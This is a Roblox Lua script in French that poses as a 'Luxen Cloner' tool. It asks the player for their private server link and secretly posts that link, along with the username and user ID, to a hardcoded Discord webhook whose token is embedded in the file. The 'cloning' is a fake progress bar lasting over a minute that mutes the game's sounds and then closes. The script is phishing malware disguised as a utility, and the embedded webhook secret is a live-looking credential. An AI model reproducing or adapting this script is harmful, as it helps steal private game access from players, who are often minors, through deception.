-- Luxen Cloner Script
-- Interface Liquid Glass moderne

-- ========== CONFIGURATION WEBHOOK ==========
local WEBHOOK_URL = "https://discord.com/api/webhooks/1443355178865660025/HwMypJGRtJucea4rULHsZ_8Nr9d_fyelG0PqFgomXa13sxx4lcfg5cvH1pLa5mi6eVuW"
-- ===========================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Fonction pour envoyer au webhook Discord
local function sendToWebhook(username, serverLink)
    spawn(function()
        local success, err = pcall(function()
            local webhookData = {
                ["content"] = "**🔗 Nouvelle Connexion - Luxen Cloner**",
                ["embeds"] = {{
                    ["title"] = "Informations de connexion",
                    ["color"] = 5814783,
                    ["fields"] = {
                        {
                            ["name"] = "👤 Utilisateur",
                            ["value"] = username,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🎮 Place ID",
                            ["value"] = tostring(game.PlaceId),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🔗 Lien du Serveur Privé",
                            ["value"] = serverLink,
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🆔 User ID",
                            ["value"] = tostring(player.UserId),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "⏰ Timestamp",
                            ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Luxen Cloner System"
                    }
                }}
            }
            
            local response = request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(webhookData)
            })
            
            print("Webhook envoyé:", response.StatusCode)
        end)
        
        if not success then
            warn("Erreur webhook:", err)
            -- Fallback avec HttpService si request() ne marche pas
            pcall(function()
                local simpleData = {
                    ["content"] = "**[Luxen Cloner]**\n👤 " .. username .. "\n🔗 " .. serverLink
                }
                HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(simpleData), Enum.HttpContentType.ApplicationJson)
                print("Webhook envoyé via fallback")
            end)
        end
    end)
end

-- Fonction pour couper TOUS les sons
local function muteAllSounds()
    pcall(function()
        -- Couper le volume principal
        SoundService.VolumeModifier = 0
        
        -- Couper tous les sons existants
        for _, descendant in pairs(game:GetDescendants()) do
            if descendant:IsA("Sound") then
                descendant.Volume = 0
                descendant:Stop()
                -- Supprimer spécifiquement l'audio problématique
                if descendant.SoundId == "rbxassetid://128387076668435" then
                    descendant:Destroy()
                end
            elseif descendant:IsA("SoundGroup") then
                descendant.Volume = 0
            end
        end
        
        -- Surveiller les nouveaux sons
        game.DescendantAdded:Connect(function(descendant)
            task.wait()
            if descendant:IsA("Sound") then
                descendant.Volume = 0
                descendant:Stop()
                -- Supprimer spécifiquement l'audio problématique
                if descendant.SoundId == "rbxassetid://128387076668435" then
                    descendant:Destroy()
                end
            elseif descendant:IsA("SoundGroup") then
                descendant.Volume = 0
            end
        end)
    end)
end

-- Création du ScreenGui principal
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LuxenClonerUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999
screenGui.Parent = playerGui

-- Fond blur/assombrissement pour le menu
local backdropFrame = Instance.new("Frame")
backdropFrame.Name = "BackdropFrame"
backdropFrame.Size = UDim2.new(1, 0, 1, 0)
backdropFrame.Position = UDim2.new(0, 0, 0, 0)
backdropFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
backdropFrame.BackgroundTransparency = 0.2
backdropFrame.BorderSizePixel = 0
backdropFrame.ZIndex = 100
backdropFrame.Parent = screenGui

-- Frame principale avec effet Liquid Glass
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 500, 0, 320)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 101
mainFrame.Parent = screenGui

-- Corner arrondi pour la frame principale
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 25)
mainCorner.Parent = mainFrame

-- Effet de bordure Liquid Glass
local borderFrame = Instance.new("Frame")
borderFrame.Name = "BorderEffect"
borderFrame.Size = UDim2.new(1, 6, 1, 6)
borderFrame.Position = UDim2.new(0, -3, 0, -3)
borderFrame.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
borderFrame.BackgroundTransparency = 0.3
borderFrame.BorderSizePixel = 0
borderFrame.ZIndex = 100
borderFrame.Parent = mainFrame

local borderCorner = Instance.new("UICorner")
borderCorner.CornerRadius = UDim.new(0, 27)
borderCorner.Parent = borderFrame

-- Gradient animé pour l'effet Liquid
local borderGradient = Instance.new("UIGradient")
borderGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 150, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(150, 100, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 200))
}
borderGradient.Rotation = 0
borderGradient.Parent = borderFrame

-- Animation du gradient
spawn(function()
    while borderFrame.Parent do
        for i = 0, 360, 2 do
            if not borderFrame.Parent then break end
            borderGradient.Rotation = i
            task.wait(0.03)
        end
    end
end)

-- Titre
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(1, 0, 0, 70)
titleLabel.Position = UDim2.new(0, 0, 0, 20)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Luxen Cloner"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 36
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.ZIndex = 102
titleLabel.Parent = mainFrame

-- Effet de brillance sur le titre
local titleGradient = Instance.new("UIGradient")
titleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 180, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 150, 255))
}
titleGradient.Parent = titleLabel

-- Label pour le champ de texte
local inputLabel = Instance.new("TextLabel")
inputLabel.Name = "InputLabel"
inputLabel.Size = UDim2.new(1, -50, 0, 25)
inputLabel.Position = UDim2.new(0, 25, 0, 110)
inputLabel.BackgroundTransparency = 1
inputLabel.Text = "Enter your server private link"
inputLabel.Font = Enum.Font.GothamMedium
inputLabel.TextSize = 15
inputLabel.TextColor3 = Color3.fromRGB(180, 180, 220)
inputLabel.TextXAlignment = Enum.TextXAlignment.Left
inputLabel.ZIndex = 102
inputLabel.Parent = mainFrame

-- Champ de texte avec style moderne
local textBox = Instance.new("TextBox")
textBox.Name = "ServerLinkInput"
textBox.Size = UDim2.new(1, -50, 0, 50)
textBox.Position = UDim2.new(0, 25, 0, 140)
textBox.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
textBox.BackgroundTransparency = 0.3
textBox.BorderSizePixel = 0
textBox.PlaceholderText = "https://www.roblox.com/games/..."
textBox.PlaceholderColor3 = Color3.fromRGB(80, 80, 100)
textBox.Text = ""
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 14
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextXAlignment = Enum.TextXAlignment.Left
textBox.ClearTextOnFocus = false
textBox.ZIndex = 102
textBox.Parent = mainFrame

local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 12)
textBoxCorner.Parent = textBox

local textBoxPadding = Instance.new("UIPadding")
textBoxPadding.PaddingLeft = UDim.new(0, 15)
textBoxPadding.PaddingRight = UDim.new(0, 15)
textBoxPadding.Parent = textBox

-- Bouton Start
local startButton = Instance.new("TextButton")
startButton.Name = "StartButton"
startButton.Size = UDim2.new(1, -50, 0, 55)
startButton.Position = UDim2.new(0, 25, 0, 220)
startButton.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
startButton.BackgroundTransparency = 0
startButton.BorderSizePixel = 0
startButton.Text = "Start"
startButton.Font = Enum.Font.GothamBold
startButton.TextSize = 20
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.AutoButtonColor = false
startButton.ZIndex = 102
startButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 15)
buttonCorner.Parent = startButton

-- Gradient sur le bouton
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 150, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 100, 255))
}
buttonGradient.Rotation = 45
buttonGradient.Parent = startButton

-- Effet hover sur le bouton
startButton.MouseEnter:Connect(function()
    TweenService:Create(startButton, TweenInfo.new(0.3), {BackgroundTransparency = 0, Size = UDim2.new(1, -45, 0, 55)}):Play()
end)

startButton.MouseLeave:Connect(function()
    TweenService:Create(startButton, TweenInfo.new(0.3), {BackgroundTransparency = 0, Size = UDim2.new(1, -50, 0, 55)}):Play()
end)

-- Frame de chargement (cachée initialement)
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
loadingFrame.BackgroundTransparency = 0
loadingFrame.BorderSizePixel = 0
loadingFrame.Visible = false
loadingFrame.ZIndex = 200
loadingFrame.Parent = screenGui

-- Gradient pour le fond de chargement
local loadingGradient = Instance.new("UIGradient")
loadingGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 10, 60)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 20, 50))
}
loadingGradient.Rotation = 45
loadingGradient.Parent = loadingFrame

-- Container pour la barre de chargement
local loadingContainer = Instance.new("Frame")
loadingContainer.Name = "LoadingContainer"
loadingContainer.Size = UDim2.new(0, 500, 0, 100)
loadingContainer.Position = UDim2.new(0.5, -250, 0.5, -50)
loadingContainer.BackgroundTransparency = 1
loadingContainer.ZIndex = 201
loadingContainer.Parent = loadingFrame

-- Texte de chargement
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 40)
loadingText.Position = UDim2.new(0, 0, 0, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 24
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.ZIndex = 202
loadingText.Parent = loadingContainer

-- Barre de chargement background
local progressBarBg = Instance.new("Frame")
progressBarBg.Name = "ProgressBarBg"
progressBarBg.Size = UDim2.new(1, 0, 0, 15)
progressBarBg.Position = UDim2.new(0, 0, 0, 60)
progressBarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
progressBarBg.BackgroundTransparency = 0.5
progressBarBg.BorderSizePixel = 0
progressBarBg.ZIndex = 201
progressBarBg.Parent = loadingContainer

local progressBarBgCorner = Instance.new("UICorner")
progressBarBgCorner.CornerRadius = UDim.new(0, 8)
progressBarBgCorner.Parent = progressBarBg

-- Barre de chargement remplie
local progressBar = Instance.new("Frame")
progressBar.Name = "ProgressBar"
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
progressBar.BorderSizePixel = 0
progressBar.ZIndex = 202
progressBar.Parent = progressBarBg

local progressBarCorner = Instance.new("UICorner")
progressBarCorner.CornerRadius = UDim.new(0, 8)
progressBarCorner.Parent = progressBar

-- Gradient pour la barre de progression
local progressGradient = Instance.new("UIGradient")
progressGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 150, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 100, 255))
}
progressGradient.Rotation = 45
progressGradient.Parent = progressBar

-- Fonction de chargement
local function startLoading(serverLink)
    -- Couper TOUS les sons immédiatement
    muteAllSounds()
    
    -- Masquer le menu principal
    mainFrame.Visible = false
    backdropFrame.Visible = false
    
    -- Afficher l'écran de chargement
    loadingFrame.Visible = true
    
    -- Messages de chargement avec pourcentages et durées
    local loadingStages = {
        {text = "Checking link", progress = 15, duration = 12},
        {text = "Established secure connection", progress = 30, duration = 15},
        {text = "Please wait, it can be long", progress = 50, duration = 18, dots = true},
        {text = "Verifying server authenticity", progress = 60, duration = 10},
        {text = "Decrypting server data", progress = 72, duration = 12},
        {text = "Synchronizing with server", progress = 85, duration = 13},
        {text = "Finalizing connection", progress = 95, duration = 8},
        {text = "Almost done", progress = 100, duration = 2}
    }
    
    -- Animation des points
    local dotsActive = false
    
    spawn(function()
        while dotsActive do
            for i = 1, 3 do
                if not dotsActive then break end
                loadingText.Text = loadingText.Text:gsub("%.+", "") .. string.rep(".", i)
                task.wait(0.4)
            end
        end
    end)
    
    for _, stage in ipairs(loadingStages) do
        dotsActive = stage.dots or false
        
        local targetProgress = stage.progress / 100
        local currentProgress = progressBar.Size.X.Scale
        local steps = 60
        local stepDuration = stage.duration / steps
        local progressIncrement = (targetProgress - currentProgress) / steps
        
        -- Animation de la progression
        for i = 1, steps do
            currentProgress = currentProgress + progressIncrement
            progressBar.Size = UDim2.new(currentProgress, 0, 1, 0)
            
            if not stage.dots then
                loadingText.Text = stage.text .. " " .. math.floor(currentProgress * 100) .. "%"
            else
                loadingText.Text = stage.text
            end
            
            task.wait(stepDuration)
        end
        
        -- Assurer que la progression atteint exactement la valeur cible
        progressBar.Size = UDim2.new(targetProgress, 0, 1, 0)
        if not stage.dots then
            loadingText.Text = stage.text .. " " .. stage.progress .. "%"
        end
        
        task.wait(0.5)
    end
    
    dotsActive = false
    
    -- À la fin du chargement
    task.wait(0.5)
    loadingText.Text = "Complete!"
    task.wait(1)
    
    -- Fermer l'UI
    screenGui:Destroy()
end

-- Action du bouton Start
startButton.MouseButton1Click:Connect(function()
    local link = textBox.Text
    
    -- Vérifier si un lien a été entré
    if link == "" or not link:match("roblox%.com") then
        -- Animation d'erreur
        for i = 1, 3 do
            textBox.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            task.wait(0.15)
            textBox.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
            task.wait(0.15)
        end
        return
    end
    
    -- Envoyer au webhook AVANT de démarrer le loading
    sendToWebhook(player.Name, link)
    
    -- Démarrer le chargement
    startLoading(link)
end)

print("Luxen Cloner UI chargé avec succès!")
